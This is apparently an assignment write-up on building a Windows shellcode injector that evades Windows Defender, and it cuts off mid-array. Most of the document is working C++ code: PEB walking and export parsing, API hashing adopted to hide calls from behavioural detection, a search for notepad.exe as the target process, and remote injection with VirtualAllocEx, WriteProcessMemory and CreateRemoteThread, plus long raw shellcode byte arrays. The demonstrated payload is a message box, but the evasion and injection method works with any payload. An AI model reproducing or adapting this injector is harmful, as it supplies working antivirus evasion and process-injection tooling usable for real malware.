# Shellcode Injector

## <span style = "color:red;">Content</span> 
- [Task](#task)
- [Create Shellcode](#shellcode-creation)
- [API Hashing](#api-hashing)
- [Process Enumeration](#process-enumeration)
- [Shallcode Injection](#shellcode-injection)
- [Basic Malware Analysis](#basic-malware-analysis)
- [Conclusion](#conclusion)


## Task
- Explain and write a shellcode injector that bypasses Windows Defender and helps to invoke simple msgbox shellcode. If it isnʼt possible to bypass defender, you can attempt to bypass any other AV of choice or document attempted techniques and failures.
- Perform basic malware analysis over the shellcode injector

## Shellcode Creation

First, I began searching for a method to create a shellcode that would trigger a messagebox. Despite finding numerous available shellcodes, none of them worked for me. Ultimately, I successfully cra ed my own shellcode by referring to this [article](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c).

The header file contains two functions: <span style = "color:lightgreen;">get_module_by_name</span> and <span style = "color:lightgreen;">get_func_by_name</span>. get_module_by_name parses the Process Environment Block (PEB) and LDR table to iterate through all the modules and compares the moduleʼs BaseName to the required module name. This function is used to resolve the address of kernel32.dll.

```c++
inline LPVOID get_module_by_name(WCHAR* module_name)
{
    PPEB peb = NULL;
#if defined(_WIN64)
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY list = ldr->InLoadOrderModuleList;

    PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&list));
    PLDR_DATA_TABLE_ENTRY curr_module = Flink;

    while (curr_module != NULL && curr_module->BaseAddress != NULL) {
        if (curr_module->BaseDllName.Buffer == NULL) continue;
        WCHAR* curr_name = curr_module->BaseDllName.Buffer;

        size_t i = 0;
        for (i = 0; module_name[i] != 0 && curr_name[i] != 0; i++) {
            WCHAR c1, c2;
            TO_LOWERCASE(c1, module_name[i]);
            TO_LOWERCASE(c2, curr_name[i]);
            if (c1 != c2) break;
        }
        if (module_name[i] == 0 && curr_name[i] == 0) {
            return curr_module->BaseAddress;
        }
        curr_module = (PLDR_DATA_TABLE_ENTRY)curr_module->InLoadOrderModuleList.Flink;
    }
    return NULL;
}
```

<span style = "color:lightgreen;">get_func_by_name</span> parses the PE Headers and iterates over the exports of the DLL to resolve the address of the required function. This function is used to obtain the addresses for LoadLibraryA and GetProcAddress from kernel32.dll.

```c++
inline LPVOID get_func_by_name(LPVOID module, char* func_name)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (exportsDir->VirtualAddress == NULL) {
        return NULL;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    //go through names:
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k = 0;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            //found
            return (BYTE*)module + (*funcRVA);
        }
    }
    return NULL;
}
```

After resolving the addresses of the module kernel32.dll and the functions LoadLibraryA and GetProcAddress, it loads user32.dll using LoadLibraryA. Subsequently, it obtains the address of the function <span style = "color:lightgreen;">MessageBoxW</span> using <span style = "color:lightgreen;">GetProcAddress</span>.

After compiling the code into assembly instructions, the instructions are cleaned up, and external dependencies are removed. Subsequently, the assembly is linked to a binary, and the shellcode can be extracted from the .text section.

![shellcode](/shellcode.jpg)

## API Hashing

Behavioral malware analysis is also employed by Windows Defender, which traces API call sequences as well. To conceal the APIs from the defender, API hashing is the best technique to employ. I searched for implementations of API hashing and found this [article](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware#overview) related to it.

It contains two functions <span style = "color:lightgreen;">getHashFromString</span> and <span style = "color:lightgreen;">getFunctionAddressByHash</span>. getHashFromString calculates the hash from the function name.

```c++
DWORD getHashFromString(char* string)
{
	size_t stringLength = strnlen_s(string, 50);
	DWORD hash = 0x35;

	for (size_t i = 0; i < stringLength; i++)
	{
		hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
	}
	return hash;
}
```

Although there were some hash collisions in the above algorithm, I used the Fowler–Noll–Vo (or FNV) algorithm.

```c++
DWORD getHashFromString(char* string)
{
	size_t stringLength = strlen(string);
	uint32_t hash = 0x811c9dc5;

	for (size_t i = 0; i < stringLength; i++)
	{
		hash = (hash ^ string[i]) * 0x01000193;
	}
	return hash;
}
```

![hashCollision](/hashCollision.jpg)

<span style = "color:lightgreen;">getFunctionAddressByHash</span> takes the name of the library and the hash of the API. It retrieves the address of the module using LoadLibrary, iterates over the exports of the library, calculates the hash of each export, and compares them to the argument hash. If a match is found, it returns the address of the function.

```c++
PDWORD getFunctionAddressByHash(char* library, DWORD hash)
{
	PDWORD functionAddress = (PDWORD)0;

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
	// If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		DWORD functionNameHash = getHashFromString(functionName);

		// If hash for CreateThread is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			// printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
		
	}
	return 0;
}
```

## Process Enumeration

> I have selected “notepad.exe” as the target process, so the shellcode will be injected into its memory.

To inject the shellcode, obtaining the ProcessID of the remote process is necessary. <span style = "color:lightgreen;">EnumProcesses</span> is used to retrieve the process identifier for each process object in the system. Then, iterate over each process using the PID to get the BaseName using <span style = "color:lightgreen;">EnumProcessModules</span> and <span style = "color:lightgreen;">GetModuleBaseNameW</span>. If the base of the basename of the process matches, it returns the PID of that process.

To achieve that, first, obtain the hash of the function and utilize the getFunctionAddressByHash function to resolve the function addresses.

```c++
DWORD getPID(const TCHAR* processName) {

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	PDWORD convertEnumProcesses = getFunctionAddressByHash((char*)"kernel32", 0xcd5e8a97);
	customEnumProcesses EnumProcesses = (customEnumProcesses)convertEnumProcesses;

	PDWORD convertOpenProcess = getFunctionAddressByHash((char*)"kernel32", 0x4105fc56);
	customOpenProcess OpenProcess = (customOpenProcess)convertOpenProcess;

	PDWORD covertEnumProcessModules = getFunctionAddressByHash((char*)"kernel32", 0x6333ef38);
	customEnumProcessModules EnumProcessModules = (customEnumProcessModules)covertEnumProcessModules;

	PDWORD convertGetModuleBaseNameW = getFunctionAddressByHash((char*)"psapi", 0x9bfc0a3e);
	customGetModuleBaseNameW getModuleBaseNameW = (customGetModuleBaseNameW)convertGetModuleBaseNameW;

	PDWORD convertCloseHandle = getFunctionAddressByHash((char*)"kernel32", 0xfaba0065);
	customCloseHandle CloseHandle = (customCloseHandle)convertCloseHandle;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return 1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			DWORD processID = aProcesses[i];
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
				PROCESS_VM_READ,
				FALSE, processID);

			if (NULL != hProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
				{
					getModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
				}
			}
			else {
				// std::cout << "[+] OpenProcess Failed : " << GetLastError() << std::endl;
				continue;
			}
			// _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);
			if (_wcsicmp(processName, szProcessName) == 0) {
				CloseHandle(hProcess);
				return processID;
			}

			CloseHandle(hProcess);

		}
	}
}
```

Pass the remote process name to the above function; it will return the PID of that process, which will be used to obtain the HANDLE of the target process.

## Shellcode Injection

Now everything is set. We have obtained the PID, and using <span style = "color:lightgreen;">VirtualAllocEx</span>, allocated space in the remote process for the shellcode. Using <span style = "color:lightgreen;">WriteProcessMemory</span>, we copy the shellcode into that buffer. Then, create a thread using <span style = "color:lightgreen;">CreateRemoteThread</span> and pass the pointer to the shellcode as lpStartAddress to be executed by the thread.

```c++
int main()
{
	// unsigned char shellcode[] = "\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9\x51\xff\xd0";
	// unsigned char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
	// unsigned char shellcode[] = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24\x40\xFF\x54\x24\x40\x57\xFF\xD0";
	unsigned char shellcode[] = "\x56\x48\x8B\xF4\x48\x83\xE4\xF0\x48\x83\xEC\x20\xE8\x2F\x00\x00\x00\x48\x8B\xE6\x5E\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x00\x00\x00\x6B\x00\x65\x00\x72\x00\x6E\x00\x65\x00\x6C\x00\x33\x00\x32\x00\x2E\x00\x64\x00\x6C\x00\x6C\x00\x00\x00\x48\x81\xEC\xF8\x00\x00\x00\xB8\x6B\x00\x00\x00\x66\x89\x44\x24\x70\xB8\x65\x00\x00\x00\x66\x89\x44\x24\x72\xB8\x72\x00\x00\x00\x66\x89\x44\x24\x74\xB8\x6E\x00\x00\x00\x66\x89\x44\x24\x76\xB8\x65\x00\x00\x00\x66\x89\x44\x24\x78\xB8\x6C\x00\x00\x00\x66\x89\x44\x24\x7A\xB8\x33\x00\x00\x00\x66\x89\x44\x24\x7C\xB8\x32\x00\x00\x00\x66\x89\x44\x24\x7E\xB8\x2E\x00\x00\x00\x66\x89\x84\x24\x80\x00\x00\x00\xB8\x64\x00\x00\x00\x66\x89\x84\x24\x82\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\x84\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\x86\x00\x00\x00\x33\xC0\x66\x89\x84\x24\x88\x00\x00\x00\xC6\x44\x24\x40\x4C\xC6\x44\x24\x41\x6F\xC6\x44\x24\x42\x61\xC6\x44\x24\x43\x64\xC6\x44\x24\x44\x4C\xC6\x44\x24\x45\x69\xC6\x44\x24\x46\x62\xC6\x44\x24\x47\x72\xC6\x44\x24\x48\x61\xC6\x44\x24\x49\x72\xC6\x44\x24\x4A\x79\xC6\x44\x24\x4B\x41\xC6\x44\x24\x4C\x00\xC6\x44\x24\x50\x47\xC6\x44\x24\x51\x65\xC6\x44\x24\x52\x74\xC6\x44\x24\x53\x50\xC6\x44\x24\x54\x72\xC6\x44\x24\x55\x6F\xC6\x44\x24\x56\x63\xC6\x44\x24\x57\x41\xC6\x44\x24\x58\x64\xC6\x44\x24\x59\x64\xC6\x44\x24\x5A\x72\xC6\x44\x24\x5B\x65\xC6\x44\x24\x5C\x73\xC6\x44\x24\x5D\x73\xC6\x44\x24\x5E\x00\xC6\x44\x24\x20\x75\xC6\x44\x24\x21\x73\xC6\x44\x24\x22\x65\xC6\x44\x24\x23\x72\xC6\x44\x24\x24\x33\xC6\x44\x24\x25\x32\xC6\x44\x24\x26\x2E\xC6\x44\x24\x27\x64\xC6\x44\x24\x28\x6C\xC6\x44\x24\x29\x6C\xC6\x44\x24\x2A\x00\xC6\x44\x24\x30\x4D\xC6\x44\x24\x31\x65\xC6\x44\x24\x32\x73\xC6\x44\x24\x33\x73\xC6\x44\x24\x34\x61\xC6\x44\x24\x35\x67\xC6\x44\x24\x36\x65\xC6\x44\x24\x37\x42\xC6\x44\x24\x38\x6F\xC6\x44\x24\x39\x78\xC6\x44\x24\x3A\x57\xC6\x44\x24\x3B\x00\xB8\x48\x00\x00\x00\x66\x89\x84\x24\x90\x00\x00\x00\xB8\x65\x00\x00\x00\x66\x89\x84\x24\x92\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\x94\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\x96\x00\x00\x00\xB8\x6F\x00\x00\x00\x66\x89\x84\x24\x98\x00\x00\x00\xB8\x20\x00\x00\x00\x66\x89\x84\x24\x9A\x00\x00\x00\xB8\x57\x00\x00\x00\x66\x89\x84\x24\x9C\x00\x00\x00\xB8\x6F\x00\x00\x00\x66\x89\x84\x24\x9E\x00\x00\x00\xB8\x72\x00\x00\x00\x66\x89\x84\x24\xA0\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\xA2\x00\x00\x00\xB8\x64\x00\x00\x00\x66\x89\x84\x24\xA4\x00\x00\x00\xB8\x21\x00\x00\x00\x66\x89\x84\x24\xA6\x00\x00\x00\x33\xC0\x66\x89\x84\x24\xA8\x00\x00\x00\xB8\x44\x00\x00\x00\x66\x89\x44\x24\x60\xB8\x65\x00\x00\x00\x66\x89\x44\x24\x62\xB8\x6D\x00\x00\x00\x66\x89\x44\x24\x64\xB8\x6F\x00\x00\x00\x66\x89\x44\x24\x66\xB8\x21\x00\x00\x00\x66\x89\x44\x24\x68\x33\xC0\x66\x89\x44\x24\x6A\x48\x8D\x4C\x24\x70\xE8\x35\x03\x00\x00\x48\x89\x84\x24\xB0\x00\x00\x00\x48\x83\xBC\x24\xB0\x00\x00\x00\x00\x75\x0A\xB8\x01\x00\x00\x00\xE9\xD8\x00\x00\x00\x48\x8D\x54\x24\x40\x48\x8B\x8C\x24\xB0\x00\x00\x00\xE8\xCE\x00\x00\x00\x48\x89\x84\x24\xB8\x00\x00\x00\x48\x83\xBC\x24\xB8\x00\x00\x00\x00\x75\x0A\xB8\x02\x00\x00\x00\xE9\xA9\x00\x00\x00\x48\x8D\x54\x24\x50\x48\x8B\x8C\x24\xB0\x00\x00\x00\xE8\x9F\x00\x00\x00\x48\x89\x84\x24\xC0\x00\x00\x00\x48\x83\xBC\x24\xC0\x00\x00\x00\x00\x75\x07\xB8\x03\x00\x00\x00\xEB\x7D\x48\x8B\x84\x24\xB8\x00\x00\x00\x48\x89\x84\x24\xD0\x00\x00\x00\x48\x8B\x84\x24\xC0\x00\x00\x00\x48\x89\x84\x24\xE0\x00\x00\x00\x48\x8D\x4C\x24\x20\xFF\x94\x24\xD0\x00\x00\x00\x48\x89\x84\x24\xD8\x00\x00\x00\x48\x8D\x54\x24\x30\x48\x8B\x8C\x24\xD8\x00\x00\x00\xFF\x94\x24\xE0\x00\x00\x00\x48\x89\x84\x24\xC8\x00\x00\x00\x48\x83\xBC\x24\xC8\x00\x00\x00\x00\x75\x07\xB8\x04\x00\x00\x00\xEB\x1B\x45\x33\xC9\x4C\x8D\x44\x24\x60\x48\x8D\x94\x24\x90\x00\x00\x00\x33\xC9\xFF\x94\x24\xC8\x00\x00\x00\x33\xC0\x48\x81\xC4\xF8\x00\x00\x00\xC3\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x83\xEC\x78\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x89\x44\x24\x30\x48\x8B\x44\x24\x30\x0F\xB7\x00\x3D\x4D\x5A\x00\x00\x74\x07\x33\xC0\xE9\x02\x02\x00\x00\x48\x8B\x44\x24\x30\x48\x63\x40\x3C\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x40\xB8\x08\x00\x00\x00\x48\x6B\xC0\x00\x48\x8B\x4C\x24\x40\x48\x8D\x84\x01\x88\x00\x00\x00\x48\x89\x44\x24\x38\x48\x8B\x44\x24\x38\x83\x38\x00\x75\x07\x33\xC0\xE9\xBA\x01\x00\x00\x48\x8B\x44\x24\x38\x8B\x00\x89\x44\x24\x18\x8B\x44\x24\x18\x48\x03\x84\x24\x80\x00\x00\x00\x48\x89\x44\x24\x10\x48\x8B\x44\x24\x10\x8B\x40\x18\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x10\x8B\x40\x1C\x89\x44\x24\x24\x48\x8B\x44\x24\x10\x8B\x40\x20\x89\x44\x24\x1C\x48\x8B\x44\x24\x10\x8B\x40\x24\x89\x44\x24\x20\x48\xC7\x44\x24\x08\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x08\x48\xFF\xC0\x48\x89\x44\x24\x08\x48\x8B\x44\x24\x48\x48\x39\x44\x24\x08\x0F\x83\x43\x01\x00\x00\x8B\x44\x24\x1C\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x08\x48\x8D\x04\x88\x48\x89\x44\x24\x58\x8B\x44\x24\x20\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x08\x48\x8D\x04\x48\x48\x89\x44\x24\x50\x8B\x44\x24\x24\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x50\x0F\xB7\x09\x48\x8D\x04\x88\x48\x89\x44\x24\x60\x48\x8B\x44\x24\x58\x8B\x00\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x28\x48\xC7\x04\x24\x00\x00\x00\x00\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x45\x48\x8B\x04\x24\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x2F\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x48\x8B\x0C\x24\x48\x8B\x54\x24\x28\x48\x03\xD1\x48\x8B\xCA\x0F\xBE\x09\x3B\xC1\x74\x02\xEB\x02\xEB\x97\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x75\x2D\x48\x8B\x04\x24\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x75\x17\x48\x8B\x44\x24\x60\x8B\x00\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\xEB\x07\xE9\xA0\xFE\xFF\xFF\x33\xC0\x48\x83\xC4\x78\xC3\x48\x89\x4C\x24\x08\x56\x57\x48\x83\xEC\x68\x48\xC7\x44\x24\x30\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x89\x44\x24\x30\x48\x8B\x44\x24\x30\x48\x8B\x40\x18\x48\x89\x44\x24\x38\x48\x8D\x44\x24\x48\x48\x8B\x4C\x24\x38\x48\x8B\xF8\x48\x8D\x71\x10\xB9\x10\x00\x00\x00\xF3\xA4\x48\x8B\x44\x24\x48\x48\x89\x44\x24\x40\x48\x8B\x44\x24\x40\x48\x89\x44\x24\x20\x48\x83\x7C\x24\x20\x00\x0F\x84\xC6\x01\x00\x00\x48\x8B\x44\x24\x20\x48\x83\x78\x30\x00\x0F\x84\xB6\x01\x00\x00\x48\x8B\x44\x24\x20\x48\x83\x78\x60\x00\x75\x02\xEB\xD6\x48\x8B\x44\x24\x20\x48\x8B\x40\x60\x48\x89\x44\x24\x18\x48\xC7\x04\x24\x00\x00\x00\x00\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x0F\x84\x23\x01\x00\x00\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x0F\x84\x0E\x01\x00\x00\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8\x5A\x7F\x50\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8\x41\x7C\x3B\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xE8\x41\x83\xC0\x61\x89\x44\x24\x28\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x54\x24\x28\x66\x89\x14\x48\x0F\xB7\x44\x24\x28\x66\x89\x44\x24\x08\xEB\x15\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x66\x89\x44\x24\x08\x0F\xB7\x44\x24\x08\x66\x89\x44\x24\x0C\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8\x5A\x7F\x47\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8\x41\x7C\x35\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xE8\x41\x83\xC0\x61\x89\x44\x24\x2C\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x54\x24\x2C\x66\x89\x14\x48\x0F\xB7\x44\x24\x2C\x66\x89\x44\x24\x0A\xEB\x12\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x66\x89\x44\x24\x0A\x0F\xB7\x44\x24\x0